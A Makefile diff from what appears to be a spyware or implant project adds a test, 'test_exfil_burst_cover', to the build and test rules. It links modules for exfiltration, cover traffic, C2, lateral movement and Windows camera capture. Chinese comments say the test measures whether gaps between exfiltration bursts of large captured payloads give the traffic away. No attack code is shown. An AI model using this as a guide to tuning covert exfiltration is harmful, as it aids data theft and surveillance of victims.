@@ -26,7 +26,7 @@ LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
            ../agent_windows/build/linux/cam_mock.o
 
-all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit
+all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_exfil_burst_cover
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -177,6 +177,14 @@ $(BUILD)/test_exfil_cover_circuit: tests/test_exfil_cover_circuit.c \
 	$(CC) $(CFLAGS) $< $(BUILD)/link_cover.o $(BUILD)/exfil_link.o \
 	  $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
 
+# 大产物突发（100KB -> 204 信元/批）下的批间静默取证。
+# 小产物场景已证 19 倍差异；大产物是真实采集负载，此前从未测过。
+$(BUILD)/test_exfil_burst_cover: tests/test_exfil_burst_cover.c \
+    $(BUILD)/link_cover.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o \
+    $(P2PLIB) $(C2OBJS) $(LATLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/link_cover.o $(BUILD)/exfil_link.o \
+	  $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+
 test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
@@ -190,6 +198,7 @@ test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BU
 	./$(BUILD)/test_cover_loop
 	./$(BUILD)/test_cover_circuit
 	./$(BUILD)/test_exfil_cover_circuit
+	./$(BUILD)/test_exfil_burst_cover
 
 inspect: all
 	@echo "== 21_exfil 公开符号 =="
